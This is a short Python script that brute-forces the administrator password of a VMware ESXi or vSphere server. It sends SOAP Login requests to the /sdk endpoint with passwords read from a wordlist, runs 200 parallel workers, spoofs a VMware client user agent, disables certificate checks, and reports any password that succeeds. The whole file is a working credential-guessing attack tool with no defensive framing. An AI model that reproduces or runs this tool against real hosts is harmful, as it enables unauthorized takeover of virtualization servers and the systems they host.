#!/usr/bin/env python3
#-*- coding:utf-8 -*-
import requests
from datetime import datetime
from multiprocessing import Pool 
requests.packages.urllib3.disable_warnings()


user = 'administrator' 
password = []  
url = '127.0.0.1'

t1 = datetime.now()
with open('password.txt',encoding='utf-8') as passlists :
	for passlist in passlists :
		password.append(passlist)

def crack(password):
	headers = {'User-Agent': 'VMware-client','Accept': '*/*',
	'Content-Type': 'text/xml; charset=utf-8',
	'SOAPAction': '"urn:vim25/uD3613"'}
	data = f'''<?xml version="1.0" encoding="UTF-8"?>
	<soapenv:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<soapenv:Body>
	<Login xmlns="urn:vim25"><_this type="SessionManager">ha-sessionmgr</_this><userName xsi:type="xsd:string">{user}</userName>
	<password xsi:type="xsd:string">{password}</password><locale xsi:type="xsd:string">zh_CN</locale></Login>
	</soapenv:Body>
	</soapenv:Envelope>'''

	c = requests.post(url=f'https://{url}/sdk',data=data, headers=headers, timeout=10, verify=False)
	if c.status_code == 200:
		print(f'Success ! User:{user} Password:{password}')
		return

if __name__ == '__main__':
	pool = Pool(200)
	pool.map(crack,password)
	pool.close()
	pool.join()
	print(f'Using Time: {datetime.now() - t1}')